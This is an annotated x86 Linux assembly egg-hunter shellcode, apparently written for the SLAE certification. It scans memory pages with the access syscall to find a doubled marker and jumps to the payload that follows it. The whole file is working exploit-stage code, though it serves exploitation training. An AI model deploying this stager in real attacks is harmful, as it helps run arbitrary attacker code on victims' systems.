;This shellcode has been created  for completing
;the requirements of the SecurityTube Linux
;Assembly Expert certification:
;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert
;
;Student ID: SLAE-500

global _start

section .text

_start:
	cld				; clearing the DF for the use of scasd
	xor edx,edx		; clearing the register
	
_nextpage:	
	or dx,0xfff		; we align ourself to PAGE_SIZE/move to the next page
					; add eax,4095					
_tryagain:
	inc edx				; the next address in the current page
	lea ebx,[edx+0x4]	; load a pointer in ebx (we add 4 in order to scan the next address also. The syscall validates 8 bytes.)
	xor eax,eax			; cear the register
	mov al,0x21			; load the syscall int access(const char *pathname, int mode);
	int 0x80			; call the syscall
	cmp al,0xf2			; if it's not a valid memory address
	jz _nextpage		; jump to the next pages
	mov eax,0x50905090	; else let's scan for the egg
	mov edi,edx			; edi gets the pointer address
	scasd				; scan for the egg
	jnz _tryagain		; if not, next address
	scasd				; scan for the egg
	jnz _tryagain		; if not, next address
	jmp edi				; The EGG!
